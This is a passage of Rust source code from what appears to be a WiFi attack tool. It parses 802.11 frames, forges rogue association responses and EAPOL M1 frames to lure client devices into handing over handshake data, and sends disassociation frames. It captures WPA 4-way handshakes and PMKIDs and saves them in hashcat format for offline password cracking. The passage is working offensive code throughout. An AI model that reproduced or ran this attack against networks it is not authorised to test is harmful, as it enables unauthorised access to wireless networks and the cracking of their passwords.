                                vec![],
                            ),
                        );

                        if ap_mac == oxide.target_data.rogue_client {
                            let rogue_ssid = ssid.unwrap_or("".to_string());
                            // We need to send an association response back
                            let frx = build_association_response(
                                &client_mac,
                                &ap_mac,
                                &ap_mac,
                                oxide.counters.sequence3(),
                                &rogue_ssid,
                            );
                            write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx)?;
                            // Then an M1
                            let m1: Vec<u8> = build_eapol_m1(
                                &client_mac,
                                &ap_mac,
                                &ap_mac,
                                oxide.counters.sequence3(),
                                &oxide.target_data.rogue_m1,
                            );
                            oxide
                                .target_data
                                .rogue_essids
                                .insert(client_mac, rogue_ssid);
                            write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &m1)?;
                            station.interactions += 2;
                        }
                    };
                    // Add AP
                    if ap_mac.is_real_device() {
                        let ap = AccessPoint::new(
                            ap_mac,
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            None,
                            Some((band, channel_u8)),
                            None,
                            oxide.target_data.rogue_client,
                        );
                        oxide.access_points.add_or_update_device(ap_mac, &ap);
                    };
                }
                Frame::AssociationResponse(assoc_response_frame) => {
                    oxide.counters.association += 1;

                    // Assumption:
                    //  Only a AP will ever submit an association response.
                    //
                    let client_mac = assoc_response_frame.header.address_1; // MAC address of the client
                    let bssid = assoc_response_frame.header.address_2; // MAC address of the AP (BSSID)

                    if bssid.is_real_device()
                        && client_mac.is_real_device()
                        && client_mac != oxide.target_data.rogue_client
                    {
                        // Valid devices
                        let mut clients = WiFiDeviceList::<Station>::new();

                        if assoc_response_frame.status_code != 0 {
                            // Association was successful
                            let client = &Station::new_station(
                                client_mac,
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                                Some(bssid),
                            );
                            clients.add_or_update_device(client_mac, client);
                            oxide.unassoc_clients.remove_device(&client_mac);
                        }
                        let station_info = &assoc_response_frame.station_info;
                        let ap = AccessPoint::new_with_clients(
                            bssid,
                            radiotap.antenna_signal.unwrap_or(
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            ),
                            None,
                            Some((band, channel_u8)),
                            Some(APFlags {
                                apie_essid: station_info.ssid.as_ref().map(|_| true),
                                gs_ccmp: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.group_cipher_suite == RsnCipherSuite::CCMP),
                                gs_tkip: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.group_cipher_suite == RsnCipherSuite::TKIP),
                                cs_ccmp: station_info.rsn_information.as_ref().map(|rsn| {
                                    rsn.pairwise_cipher_suites.contains(&RsnCipherSuite::CCMP)
                                }),
                                cs_tkip: station_info.rsn_information.as_ref().map(|rsn| {
                                    rsn.pairwise_cipher_suites.contains(&RsnCipherSuite::TKIP)
                                }),
                                rsn_akm_psk: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSK)),
                                rsn_akm_psk256: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSK256)),
                                rsn_akm_pskft: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSKFT)),
                                wpa_akm_psk: station_info
                                    .wpa_info
                                    .as_ref()
                                    .map(|wpa| wpa.akm_suites.contains(&WpaAkmSuite::Psk)),
                                ap_mfp: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.mfp_required),
                            }),
                            clients,
                            oxide.target_data.rogue_client,
                        );
                        oxide.access_points.add_or_update_device(bssid, &ap);
                    };
                }
                Frame::ReassociationRequest(frame) => {
                    oxide.counters.reassociation += 1;

                    // Assumption:
                    //  Only a client will ever submit an reassociation request.
                    //  Attack includes sending a reassociation response and M1 frame- looks very similar to attacking an associataion request.
                    let client_mac = frame.header.address_2; // MAC address of the client
                    let new_ap = frame.header.address_1; // MAC address of the AP
                    let old_ap = frame.current_ap_address;
                    let ssid = frame.station_info.ssid;

                    // Technically the client is still associated to the old AP. Let's add it there and we will handle moving it over if we get a reassociation response.
                    if old_ap.is_real_device()
                        && client_mac.is_real_device()
                        && client_mac != oxide.target_data.rogue_client
                    {
                        // Valid devices
                        let mut clients = WiFiDeviceList::<Station>::new();

                        // Setup client
                        let client = &Station::new_station(
                            client_mac,
                            radiotap.antenna_signal.unwrap_or(
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            ),
                            Some(old_ap),
                        );
                        clients.add_or_update_device(client_mac, client);
                        oxide.unassoc_clients.remove_device(&client_mac);

                        let ap = AccessPoint::new_with_clients(
                            old_ap,
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            ssid.clone(),
                            None,
                            None,
                            clients,
                            oxide.target_data.rogue_client,
                        );
                        oxide.access_points.add_or_update_device(old_ap, &ap);

                        let newap = AccessPoint::new_with_clients(
                            new_ap,
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            ssid.clone(),
                            Some((band, channel_u8)),
                            None,
                            WiFiDeviceList::<Station>::new(),
                            oxide.target_data.rogue_client,
                        );
                        oxide.access_points.add_or_update_device(new_ap, &newap);
                    };
                }
                Frame::ReassociationResponse(frame) => {
                    oxide.counters.reassociation += 1;
                    // Assumption:
                    //  Only a AP will ever submit a reassociation response.
                    //
                    let client_mac = frame.header.address_1; // MAC address of the client
                    let ap_mac = frame.header.address_2; // MAC address of the AP (BSSID)

                    if ap_mac.is_real_device()
                        && client_mac.is_real_device()
                        && client_mac != oxide.target_data.rogue_client
                    {
                        // Valid devices
                        let mut clients = WiFiDeviceList::<Station>::new();

                        if frame.status_code != 0 {
                            // Association was successful
                            let client = &Station::new_station(
                                client_mac,
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                                Some(ap_mac),
                            );
                            clients.add_or_update_device(client_mac, client);
                            oxide.unassoc_clients.remove_device(&client_mac);
                            // Find the old AP, remove this device from it.
                            if let Some(old_ap) =
                                oxide.access_points.find_ap_by_client_mac(&client_mac)
                            {
                                old_ap.client_list.remove_device(&client_mac);
                            }
                        }
                        let ap = AccessPoint::new_with_clients(
                            ap_mac,
                            radiotap.antenna_signal.unwrap_or(
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            ),
                            None,
                            Some((band, channel_u8)),
                            None,
                            clients,
                            oxide.target_data.rogue_client,
                        );
                        oxide.access_points.add_or_update_device(ap_mac, &ap);
                    };
                }
                Frame::Rts(frame) => {
                    oxide.counters.control_frames += 1;
                    // Most drivers (Mediatek, Ralink, Atheros) don't seem to be actually sending these to userspace (on linux).
                    let source_mac = frame.source; // MAC address of the source
                    let dest_mac = frame.destination; // MAC address of the destination
                    let from_ds: bool = frame.frame_control.from_ds();
                    let to_ds: bool = frame.frame_control.to_ds();

                    // Figure out our AP and Client using from_ds / to_ds
                    let ap_addr = if from_ds && !to_ds {
                        source_mac
                    } else if !from_ds && to_ds {
                        dest_mac
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };
                    let station_addr = if !from_ds && to_ds {
                        source_mac
                    } else {
                        dest_mac
                    };

                    let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    if station_addr.is_real_device()
                        && station_addr != oxide.target_data.rogue_client
                    {
                        // Make sure this isn't a broadcast or something

                        let client = &Station::new_station(
                            station_addr,
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                            },
                            Some(ap_addr),
                        );
                        clients.add_or_update_device(station_addr, client);
                        oxide.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = AccessPoint::new_with_clients(
                        ap_addr,
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                        },
                        None,
                        Some((band, channel_u8)),
                        None,
                        clients,
                        oxide.target_data.rogue_client,
                    );
                    oxide.access_points.add_or_update_device(ap_addr, &ap);
                }
                Frame::Cts(_) => {
                    oxide.counters.control_frames += 1;
                    // Not really doing anything with these yet...
                }
                Frame::Ack(_) => {
                    oxide.counters.control_frames += 1;
                    // Not really doing anything with these yet...
                }
                Frame::BlockAck(frame) => {
                    oxide.counters.control_frames += 1;
                    //println!("BlockAck: {} => {}", frame.source, frame.destination);
                    let source_mac = frame.source; // MAC address of the source
                    let dest_mac = frame.destination; // MAC address of the destination
                    let from_ds: bool = frame.frame_control.from_ds();
                    let to_ds: bool = frame.frame_control.to_ds();

                    // Figure out our AP and Client using from_ds / to_ds
                    let ap_addr = if from_ds && !to_ds {
                        source_mac
                    } else if !from_ds && to_ds {
                        dest_mac
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };
                    let station_addr = if !from_ds && to_ds {
                        source_mac
                    } else {
                        dest_mac
                    };

                    let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    if station_addr.is_real_device()
                        && station_addr != oxide.target_data.rogue_client
                    {
                        // Make sure this isn't a broadcast or something

                        let client = &Station::new_station(
                            station_addr,
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                            },
                            Some(ap_addr),
                        );
                        clients.add_or_update_device(station_addr, client);
                        oxide.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = AccessPoint::new_with_clients(
                        ap_addr,
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                        },
                        None,
                        Some((band, channel_u8)),
                        None,
                        clients,
                        oxide.target_data.rogue_client,
                    );
                    oxide.access_points.add_or_update_device(ap_addr, &ap);
                }
                Frame::BlockAckRequest(frame) => {
                    oxide.counters.control_frames += 1;
                    let source_mac = frame.source; // MAC address of the source
                    let dest_mac = frame.destination; // MAC address of the destination
                    let from_ds: bool = frame.frame_control.from_ds();
                    let to_ds: bool = frame.frame_control.to_ds();

                    // Figure out our AP and Client using from_ds / to_ds
                    let ap_addr = if from_ds && !to_ds {
                        source_mac
                    } else if !from_ds && to_ds {
                        dest_mac
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };
                    let station_addr = if !from_ds && to_ds {
                        source_mac
                    } else {
                        dest_mac
                    };

                    let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    if station_addr.is_real_device()
                        && station_addr != oxide.target_data.rogue_client
                    {
                        // Make sure this isn't a broadcast or something

                        let client = &Station::new_station(
                            station_addr,
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                            },
                            Some(ap_addr),
                        );
                        clients.add_or_update_device(station_addr, client);
                        oxide.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = AccessPoint::new_with_clients(
                        ap_addr,
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                        },
                        None,
                        Some((band, channel_u8)),
                        None,
                        clients,
                        oxide.target_data.rogue_client,
                    );
                    oxide.access_points.add_or_update_device(ap_addr, &ap);
                }
                Frame::Data(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide, (band, channel_u8))?
                }
                Frame::NullData(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide, (band, channel_u8))?
                }
                Frame::QosNull(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide, (band, channel_u8))?
                }
                Frame::QosData(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide, (band, channel_u8))?
                }
                Frame::DataCfAck(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide, (band, channel_u8))?
                }
                Frame::DataCfPoll(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide, (band, channel_u8))?
                }
                Frame::DataCfAckCfPoll(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide, (band, channel_u8))?
                }
                Frame::CfAck(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide, (band, channel_u8))?
                }
                Frame::CfPoll(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide, (band, channel_u8))?
                }
                Frame::CfAckCfPoll(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide, (band, channel_u8))?
                }
                Frame::QosDataCfAck(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide, (band, channel_u8))?
                }
                Frame::QosDataCfPoll(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide, (band, channel_u8))?
                }
                Frame::QosDataCfAckCfPoll(data_frame) => {
                    handle_data_frame(&data_frame, &radiotap, oxide, (band, channel_u8))?
                }
                Frame::QosCfPoll(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide, (band, channel_u8))?
                }
                Frame::QosCfAckCfPoll(data_frame) => {
                    handle_null_data_frame(&data_frame, &radiotap, oxide, (band, channel_u8))?
                }
            }
            // Post Processing
        }
        Err(err) => {
            match err {
                libwifi::error::Error::Failure(message, _data) => match &message[..] {
                    "An error occured while parsing the data: nom::ErrorKind is Eof" => {}
                    _ => {
                        oxide.status_log.add_message(StatusMessage::new(
                            MessageType::Error,
                            format!("Libwifi Parsing Error: {message:?}",),
                        ));
                        oxide.counters.error_count += 1;
                    }
                },
                libwifi::error::Error::Incomplete(message) => {}
                libwifi::error::Error::UnhandledFrameSubtype(_, _) => {}
                libwifi::error::Error::UnhandledProtocol(message) => {}
            }
            return Err("Parsing Error".to_owned());
        }
    };

    let freq = current_channel.to_frequency().map(|freq| freq as f64);
    let signal = radiotap.antenna_signal.map(|signal| signal.value as i32);
    let rate = radiotap.rate.map(|rate| rate.value as f64);

    let frxdata = FrameData::new(
        SystemTime::now(),
        packet_id,
        packet.to_vec(),
        source,
        destination,
        freq,
        signal,
        rate,
        oxide.if_hardware.interface_uuid,
    );

    // Send to pcap
    oxide.file_data.current_pcap.send(frxdata.clone());

    Ok(())
}

fn handle_data_frame(
    data_frame: &impl DataFrame,
    rthdr: &Radiotap,
    oxide: &mut OxideRuntime,
    chan: (WiFiBand, u8),
) -> Result<(), String> {
    oxide.counters.data += 1;

    let source = data_frame.header().src().expect("Unable to get src");
    let dest = data_frame.header().dest();
    let from_ds: bool = data_frame.header().frame_control.from_ds();
    let to_ds: bool = data_frame.header().frame_control.to_ds();
    let ap_addr = if from_ds && !to_ds {
        data_frame.header().address_2
    } else if !from_ds && to_ds {
        data_frame.header().address_1
    } else {
        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
        // lets just ignore it lol
        return Ok(());
    };

    let station_addr = if !from_ds && to_ds {
        data_frame.header().address_2
    } else {
        data_frame.header().address_1
    };

    let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
    let signal = rthdr
        .antenna_signal
        .unwrap_or(AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?);

    if ap_addr != oxide.target_data.rogue_client {
        if station_addr.is_real_device() && station_addr != oxide.target_data.rogue_client {
            // Make sure this isn't a broadcast or something
            let client = &Station::new_station(
                station_addr,
                if to_ds {
                    signal
                } else {
                    AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                },
                Some(ap_addr),
            );
            clients.add_or_update_device(station_addr, client);
            oxide.unassoc_clients.remove_device(&station_addr);
        }

        // Create and Add/Update AccessPoint
        let ap = AccessPoint::new_with_clients(
            ap_addr,
            if from_ds {
                signal
            } else {
                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
            },
            None,
            Some(chan),
            None,
            clients,
            oxide.target_data.rogue_client,
        );
        oxide.access_points.add_or_update_device(ap_addr, &ap);
    }

    // Handle frames that contain EAPOL.
    if let Some(eapol) = data_frame.eapol_key().clone() {
        oxide.counters.eapol_count += 1;

        if ap_addr == oxide.target_data.rogue_client
            && (eapol.determine_key_type() == libwifi::frame::MessageType::Message2)
        {
            let essid = oxide.target_data.rogue_essids.get(&station_addr);
            let mut rogue_eapol = oxide.target_data.rogue_m1.clone();
            rogue_eapol.timestamp = eapol
                .timestamp
                .checked_sub(Duration::from_millis(10))
                .unwrap_or(eapol.timestamp);

            // Add our rogue M1
            let _ = oxide.handshake_storage.add_or_update_handshake(
                &ap_addr,
                &station_addr,
                rogue_eapol,
                essid.cloned(),
            );

            // Add the RogueM2
            let result = oxide.handshake_storage.add_or_update_handshake(
                &ap_addr,
                &station_addr,
                eapol.clone(),
                essid.cloned(),
            );

            // Set to apless
            if let Ok(handshake) = result {
                handshake.apless = true;
            }

            // Set to apless
            //oxide.handshake_storage.set_apless_for_ap(&ap_addr);

            // Set the Station that we collected a RogueM2
            if let Some(station) = oxide.unassoc_clients.get_device(&station_addr) {
                station.has_rogue_m2 = true;
                station
                    .rogue_actions
                    .entry(essid.unwrap().to_string())
                    .or_insert(true);
            }

            // Print a status so we have it for headless

            oxide.status_log.add_message(StatusMessage::new(
                MessageType::Priority,
                format!(
                    "RogueM2 Collected!: {dest} => {source} ({})",
                    essid.unwrap()
                ),
            ));

            // Don't need to go any further, because we know this wasn't a valid handshake otherwise.
            return Ok(());
        }

        let ap = if let Some(ap) = oxide.access_points.get_device(&ap_addr) {
            ap
        } else {
            return Ok(());
        };

        let essid = ap.ssid.clone();

        if station_addr == oxide.target_data.rogue_client
            && eapol.determine_key_type() == libwifi::frame::MessageType::Message1
        {
            let frx = build_disassocation_from_client(
                &ap_addr,
                &station_addr,
                oxide.counters.sequence2(),
            );
            let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
            ap.interactions += 1;
            if oxide.handshake_storage.has_m1_for_ap(&ap_addr) {
                return Ok(());
            }
        }

        let result = oxide.handshake_storage.add_or_update_handshake(
            &ap_addr,
            &station_addr,
            eapol.clone(),
            essid,
        );
        match result {
            Ok(handshake) => {
                oxide.status_log.add_message(StatusMessage::new(
                    MessageType::Info,
                    format!(
                        "New Eapol: {dest} => {source} ({})",
                        eapol.determine_key_type()
                    ),
                ));
                if handshake.complete() {
                    if let Some(ap) = oxide.access_points.get_device(&ap_addr) {
                        ap.has_hs = true;

                        oxide.status_log.add_message(StatusMessage::new(
                            MessageType::Priority,
                            format!(
                                "4wHS Complete: {dest} => {source} ({})",
                                ap.ssid.clone().unwrap_or("".to_string())
                            ),
                        ));
                    }
                }
                if handshake.has_pmkid() {
                    if let Some(ap) = oxide.access_points.get_device(&ap_addr) {
                        ap.has_pmkid = true;

                        oxide.status_log.add_message(StatusMessage::new(
                            MessageType::Priority,
                            format!(
                                "PMKID Caught: {dest} => {source} ({})",
                                ap.ssid.clone().unwrap_or("".to_string())
                            ),
                        ));
                    }
                }
            }
            Err(e) => {
                oxide.status_log.add_message(StatusMessage::new(
                    MessageType::Warning,
                    format!(
                        "Eapol Failed to Add: {dest} => {source} ({}) | {e}",
                        eapol.determine_key_type(),
                    ),
                ));
            }
        }
    }
    Ok(())
}

fn handle_null_data_frame(
    data_frame: &impl NullDataFrame,
    rthdr: &Radiotap,
    oxide: &mut OxideRuntime,
    chan: (WiFiBand, u8),
) -> Result<(), String> {
    oxide.counters.null_data += 1;
    let from_ds: bool = data_frame.header().frame_control.from_ds();
    let to_ds: bool = data_frame.header().frame_control.to_ds();
    let powersave: bool = data_frame.header().frame_control.pwr_mgmt();
    let ap_addr = if from_ds && !to_ds {
        data_frame.header().address_2
    } else if !from_ds && to_ds {
        data_frame.header().address_1
    } else {
        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
        // lets just ignore it lol
        return Ok(());
    };

    let station_addr = if !from_ds && to_ds {
        data_frame.header().address_2
    } else {
        data_frame.header().address_1
    };

    let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
    let signal = rthdr
        .antenna_signal
        .unwrap_or(AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?);

    if station_addr.is_real_device() && station_addr != oxide.target_data.rogue_client {
        // Make sure this isn't a broadcast or something

        let client = &Station::new_station(
            station_addr,
            if to_ds {
                signal
            } else {
                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
            },
            Some(ap_addr),
        );
        clients.add_or_update_device(station_addr, client);
        oxide.unassoc_clients.remove_device(&station_addr);
    }
    let ap = AccessPoint::new_with_clients(
        ap_addr,
        if from_ds {
            signal
        } else {
            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
        },
        None,
        Some(chan),
        None,
        clients,
        oxide.target_data.rogue_client,
    );
    oxide.access_points.add_or_update_device(ap_addr, &ap);

    // Check PS State:
    if !powersave && station_addr != oxide.target_data.rogue_client {
        // Client is awake... potentially... try reassociation attack?
        //anon_reassociation_attack(oxide, &ap_addr)?;
    }

    Ok(())
}

fn write_packet(fd: i32, packet: &[u8]) -> Result<(), String> {
    let bytes_written =
        unsafe { libc::write(fd, packet.as_ptr() as *const libc::c_void, packet.len()) };

    if bytes_written < 0 {
        // An error occurred during write
        let error_code = io::Error::last_os_error();

        return Err(error_code.to_string());
    }

    Ok(())
}

fn read_frame(oxide: &mut OxideRuntime) -> Result<Vec<u8>, io::Error> {
    let mut buffer = vec![0u8; 6000];
    let packet_len = unsafe {
        libc::read(
            oxide.raw_sockets.rx_socket.as_raw_fd(),
            buffer.as_mut_ptr() as *mut libc::c_void,
            buffer.len(),
        )
    };

    // Handle non-blocking read
    if packet_len < 0 {
        let error_code = io::Error::last_os_error();
        if error_code.kind() == io::ErrorKind::WouldBlock {
            oxide.counters.empty_reads += 1;
            return Ok(Vec::new());
        } else {
            // An actual error occurred
            oxide.counters.error_count += 1;
            oxide.status_log.add_message(StatusMessage::new(
                MessageType::Error,
                format!("Error Reading from Socket: {:?}", error_code.kind()),
            ));
            return Err(error_code);
        }
    }

    buffer.truncate(packet_len as usize);
    Ok(buffer)
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let cli = Arguments::parse();

    if !geteuid().is_root() {
        println!("{}", get_art("You need to run as root!"));
        exit(EXIT_FAILURE);
    }

    let mut oxide = OxideRuntime::new(&cli);

    oxide.status_log.add_message(StatusMessage::new(
        MessageType::Info,
        "Starting...".to_string(),
    ));

    let iface = oxide.if_hardware.interface.clone();
    let idx = iface.index.unwrap();
    let interface_name = String::from_utf8(iface.clone().name.unwrap())
        .expect("cannot get interface name from bytes.");

    let duration = Duration::from_secs(1);
    thread::sleep(duration);

    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();

    let mut seconds_timer = Instant::now();
    let seconds_interval = Duration::from_secs(1);
    let mut frame_count_old = 0u64;
    let mut frame_rate = 0u64;

    let mut last_status_time = Instant::now();

    let status_interval = Duration::from_secs(1);

    /*
    let mut last_interactions_clear = Instant::now();
    let interactions_interval = Duration::from_secs(120);
    */

    // Setup hop data
    let mut last_hop_time = Instant::now();
    let mut first_channel = (0u8, 0u8);
    let mut hop_cycle: u32 = 0;

    // Set starting channel and create the hopper cycle.
    let mut channels_binding = oxide.if_hardware.hop_channels.clone();
    let mut cycle_iter = channels_binding.iter().cycle();
    if let Some(&(band, channel)) = cycle_iter.next() {
        first_channel = (band, channel);
        if let Err(e) = set_interface_chan(idx, channel, band) {
            eprintln!("{}", e);
        }
    }

    oxide.status_log.add_message(StatusMessage::new(
        MessageType::Info,
        format!(
            "Setting channel hopper: {:?}",
            oxide.if_hardware.hop_channels
        ),
    ));

    let start_time = Instant::now();

    let mut err: Option<String> = None;
    let mut exit_on_succ = false;

    ctrlc::set_handler(move || {
        r.store(false, Ordering::SeqCst);
    })
    .expect("Error setting Ctrl-C handler");

    while running.load(Ordering::SeqCst) {
        // Update our interface
        oxide.if_hardware.interface =
            match get_interface_info_idx(oxide.if_hardware.interface.index.unwrap()) {
                Ok(interface) => interface,
                Err(e) => {
                    // Uh oh... no interface
                    err = Some(e);
                    running.store(false, Ordering::SeqCst);
                    break;
                }
            };

        // Calculate status rates
        if seconds_timer.elapsed() >= seconds_interval {
            seconds_timer = Instant::now();

            // Calculate the frame rate
            let frames_processed = oxide.counters.frame_count - frame_count_old;
            frame_count_old = oxide.counters.frame_count;
            frame_rate = frames_processed;

            // Update the empty reads rate
            oxide.counters.empty_reads_rate = oxide.counters.empty_reads;
            oxide.counters.empty_reads = 0;
        }

        // Make sure our pcap isn't too big, replace if it is.
        if oxide.file_data.current_pcap.check_size() >= 100000000u64 {
            oxide.file_data.current_pcap.stop(true);
            let now: chrono::prelude::DateTime<Local> = Local::now();
            let date_time = now.format("-%Y-%m-%d_%H-%M-%S").to_string();
            let pcap_filename = format!("{}{}.pcapng", oxide.file_data.file_prefix, date_time);
            let mut pcap_file = PcapWriter::new(&iface, &pcap_filename);
            pcap_file.start();
            oxide.file_data.current_pcap = pcap_file;
            oxide.file_data.output_files.push(pcap_filename);
        }

        // Channel hopping. This can still interrupt multi-step attacks but isn't likely to do so.
        if last_hop_time.elapsed() >= oxide.if_hardware.hop_interval {
            if let Some(&(band, channel)) = cycle_iter.next() {
                if (band, channel) == first_channel {
                    hop_cycle += 1;
                }
                if let Err(e) = oxide
                    .if_hardware
                    .netlink
                    .set_interface_chan(idx, channel, band)
                {
                    oxide.status_log.add_message(StatusMessage::new(
                        MessageType::Error,
                        format!("Error: {e:?}"),
                    ));
                }
                oxide.if_hardware.current_channel =
                    WiFiChannel::new(channel, WiFiBand::from_u8(band).unwrap()).unwrap();
                last_hop_time = Instant::now();
            }
        }

        // Headless UI status messages
        if last_status_time.elapsed() >= status_interval {
            last_status_time = Instant::now();
            oxide.status_log.add_message(StatusMessage::new(
                MessageType::Info,
                format!(
                    "Frames: {} | Rate: {} | ERs: {} | Channel: {}",
                    oxide.counters.frame_count,
                    frame_rate,
                    oxide.counters.empty_reads_rate,
                    oxide.if_hardware.current_channel
                ),
            ));
        }

        // Read Frame
        match read_frame(&mut oxide) {
            Ok(packet) => {
                if !packet.is_empty() {
                    let _ = process_frame(&mut oxide, &packet);
                }
            }
            Err(code) => {
                if code.kind().to_string() == "network down" {
                    oxide
                        .if_hardware
                        .netlink
                        .set_interface_up(oxide.if_hardware.interface.index.unwrap())
                        .ok();
                } else {
                    // This will result in "a serious packet read error" message.
                    err = Some(code.kind().to_string());
                    running.store(false, Ordering::SeqCst);
                }
            }
        };
        // Save those precious CPU cycles when we can. Any more of a wait and we can't process fast enough.
        thread::sleep(Duration::from_micros(1));
    }

    if exit_on_succ {
        println!("💲 Auto Exit Initiated");
    }

    println!("💲 Cleaning up...");
    if let Some(err) = err {
        println!("{}", get_art(&format!("Error: {}", err)))
    }

    println!("💲 Setting {} down.", interface_name);
    match oxide.if_hardware.netlink.set_interface_down(idx) {
        Ok(_) => {}
        Err(e) => println!("Error: {e:?}"),
    }

    println!(
        "💲 Restoring {} MAC back to {}.",
        interface_name, oxide.if_hardware.original_address
    );
    oxide
        .if_hardware
        .netlink
        .set_interface_mac(idx, &oxide.if_hardware.original_address.0)
        .ok();

    println!("💲 Setting {} to station mode.", interface_name);
    match oxide.if_hardware.netlink.set_interface_station(idx) {
        Ok(_) => {}
        Err(e) => println!("Error: {e:?}"),
    }

    println!("💲 Stopping Threads");
    oxide.file_data.current_pcap.stop(false);

    println!();

    // Hashmap<SSID, Vec<hashline>>
    let mut handshakes_map: HashMap<String, Vec<String>> = HashMap::new();

    // Write handshakes to their respective files.
    for (_, handshakes) in oxide.handshake_storage.get_handshakes() {
        if !handshakes.is_empty() {
            for hs in handshakes {
                if hs.complete() {
                    if let Some(hashcat_string) = hs.to_hashcat_22000_format() {
                        let essid = hs.essid_to_string();
                        let hashline = hashcat_string;
                        handshakes_map.entry(essid).or_default().push(hashline);
                    }
                }
            }
        }
    }

    let hashfiles = write_handshakes(&handshakes_map).expect("Error writing handshakes");
    print_handshake_summary(&handshakes_map);
    oxide.file_data.output_files.extend(hashfiles);

    let mut file = oxide.file_data.file_prefix.to_owned();
    if file == "oxide" {
        let now: chrono::prelude::DateTime<Local> = Local::now();
        let date_time = now.format("-%Y-%m-%d_%H-%M-%S").to_string();
        file = format!("oxide{}", date_time);
    }

    println!();
    println!("Complete! Happy Cracking! 🤙");

    Ok(())
}

fn write_handshakes(handshakes_map: &HashMap<String, Vec<String>>) -> Result<Vec<String>, ()> {
    let mut hashfiles = Vec::new();
    for (key, values) in handshakes_map {
        let file_name = format!("{}.hc22000", key);
        let mut file = File::create(&file_name).expect("Could not open hashfile for writing.");

        for value in values {
            let _ = writeln!(file, "{}", value);
        }
        hashfiles.push(file_name);
    }
    Ok(hashfiles)
}

fn print_handshake_summary(handshakes_map: &HashMap<String, Vec<String>>) {
    if !handshakes_map.is_empty() {
        println!("😈 Results:");
        for (key, values) in handshakes_map {
            let (handshake_count, pmkid_count) =
                values
                    .iter()
                    .fold((0, 0), |(mut handshake_acc, mut pmkid_acc), value| {
                        if value.contains("WPA*02*") {
                            handshake_acc += 1;
                        }
                        if value.contains("WPA*01") {
                            pmkid_acc += 1;
                        }
                        (handshake_acc, pmkid_acc)
                    });

            println!(
                "[{}] : 4wHS: {} | PMKID: {}",
                key, handshake_count, pmkid_count
            );
        }
        println!();
    } else {
        println!(
